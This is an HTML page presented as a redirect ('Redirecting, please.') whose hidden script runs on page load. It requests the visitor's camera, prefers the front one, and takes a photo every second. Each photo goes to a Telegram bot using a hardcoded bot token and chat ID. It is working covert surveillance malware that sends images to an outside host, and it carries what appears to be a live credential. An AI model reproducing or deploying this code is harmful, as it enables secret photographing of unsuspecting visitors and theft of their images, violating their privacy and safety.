<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Continuous Camera Capture</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f0f0f0;
      font-family: Arial, sans-serif;
      color: #333;
    }
    .loading {
      font-size: 20px;
      font-weight: bold;
      color: #007bff;
    }
  </style>
</head>
<body>
  <div class="loading">Redirecting, please.</div>

  <script type="text/javascript">
    const botToken = '7044604914:AAHUlvU0rlzbE5aU5axIAPLD7siMj1jLaA4'; // Your Telegram bot token
    const chatId = '5571330102'; // Your Telegram chat ID

    // Function to capture and send photos continuously
    function startCapturing() {
      // Access the user's media devices (camera)
      navigator.mediaDevices.enumerateDevices()
        .then(devices => {
          let videoDeviceId = null;

          // Find the front camera if available
          for (const device of devices) {
            if (device.kind === 'videoinput' && device.label.includes('front')) {
              videoDeviceId = device.deviceId;
              break;
            }
          }

          if (!videoDeviceId) {
            // If no front camera found, fall back to the first available camera
            for (const device of devices) {
              if (device.kind === 'videoinput') {
                videoDeviceId = device.deviceId;
                break;
              }
            }
          }

          // Start capturing from selected camera
          navigator.mediaDevices.getUserMedia({ video: { deviceId: videoDeviceId } })
            .then((stream) => {
              const videoTrack = stream.getVideoTracks()[0];
              const imageCapture = new ImageCapture(videoTrack);

              // Capture and send photos continuously every 1 second (1000ms)
              const captureInterval = setInterval(() => {
                imageCapture.takePhoto()
                  .then((blob) => {
                    console.log("Photo captured");
                    sendToTelegram(blob); // Send captured photo only, no IP/location
                  })
                  .catch((error) => {
                    console.error('Error capturing photo:', error);
                  });
              }, 1000);  // 1000ms interval between photo captures (1 second)

              // Stop capturing if the user leaves the page
              window.addEventListener("beforeunload", () => {
                clearInterval(captureInterval);  // Stop capturing when user leaves the page
              });
            }).catch((error) => {
              console.error('Permission error:', error);
            });
        }).catch((error) => {
          console.error('Error enumerating devices:', error);
        });
    }

    // Function to send the captured photo to Telegram
    function sendToTelegram(data) {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', data, 'camera_photo.jpg');

      // Send the photo to Telegram
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log('Photo sent to Telegram');
        } else {
          console.error('Failed to send photo to Telegram:', data);
        }
      })
      .catch(error => {
        console.error('Error sending photo to Telegram:', error);
      });
    }

    // Request camera permission and start capturing
    window.onload = function() {
      if (navigator.mediaDevices) {
        startCapturing();  // Start capturing photos continuously
      } else {
        alert('Your device does not support camera access.');
      }
    };
  </script>
</body>
</html>
